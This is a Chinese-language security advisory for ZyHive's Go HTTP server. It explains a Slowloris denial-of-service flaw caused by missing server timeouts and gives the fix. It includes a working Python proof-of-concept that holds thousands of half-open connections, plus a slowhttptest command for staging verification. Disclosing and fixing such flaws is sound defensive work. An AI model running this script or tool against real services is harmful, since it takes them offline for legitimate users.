# B004 · Slowloris — `http.Server` 缺 timeouts

> **严重度**: 🟠 HIGH（无认证可触发，单台 IP 几行 Python 即可让服务下线）
> **状态**: ✅ 已修复 26.5.10v5
> **报告人**: ZyHive 团队主动审计

---

## 影响

`http.Server` 没设任何 timeout：

```go
srv := &http.Server{Addr: addr, Handler: r}
```

缺：
- `ReadHeaderTimeout` — 客户端可慢慢发 HTTP 头（每秒 1 字节），服务端一直在读，连接占住 fd
- `IdleTimeout` — keep-alive 闲置连接不主动关
- `ReadTimeout` / `WriteTimeout` — SSE 用，不能设（聊天会被截）

**Slowloris** 经典攻击：
1. 攻击者用单 IP 开 1000 TCP 连接到 `:8080`
2. 每个连接发 `GET / HTTP/1.1\r\n` 后挂起
3. 每隔 30s 发一字节 keep-alive
4. 服务端 fd 池打满（默认 ulimit ~1024）→ 后续真实用户无法连接 → 服务事实下线

无需认证、无需 payload、单 IP 即可。

## PoC

```python
import socket, time
sockets = []
for _ in range(2000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("target", 8080))
    s.send(b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: x\r\n")
    sockets.append(s)
    time.sleep(0.005)
# 每隔 60s 发一字节保活
while True:
    for s in sockets:
        try: s.send(b"X-Probe: x\r\n")
        except: pass
    time.sleep(60)
```

跑这一段，目标 ZyHive 实例新连接就排不进来了。

## 修复

`cmd/aipanel/main.go`：
```go
srv := &http.Server{
    Addr:              addr,
    Handler:           r,
    ReadHeaderTimeout: 10 * time.Second,  // 头部读取上限
    IdleTimeout:       120 * time.Second, // keep-alive 上限
    // ReadTimeout / WriteTimeout 不设, SSE chat 需要长连接
}
```

策略：
- 读头部 10 秒不完成 → 直接踹掉
- 闲置 120 秒 → 主动关
- SSE 聊天 / 流式响应不受影响（Read/Write timeout 没设）

## 兼容性

- 普通客户端发请求都 < 100ms 完成头部 → 10s 完全无感
- SSE chat 完整保留（持续 5+ 分钟也 OK）
- 慢网络客户端：仍正常工作（10s 是头部时延，不是整体）

## 测试

时间敏感的网络测试在 unit test 里不易写。本修复是 1 行配置改动，由 `cmd/aipanel/main_test.go` 现有测试覆盖（已确保 server 启动配置语法正确）。

实际验证可在生产前走 staging：
```bash
# 安装 slowhttptest
sudo apt install slowhttptest
slowhttptest -c 1000 -X -g -o slow_report -i 10 -r 200 -t GET -u http://target:8080
```

修复后预期：所有 1000 慢连接被服务端在 10 秒内主动关闭。

## 升级建议

- ✅ 立即升级（公开端口实例尤其重要）
- 反向代理（nginx / caddy）层面通常已有 timeout 兜底，但应用层不该依赖
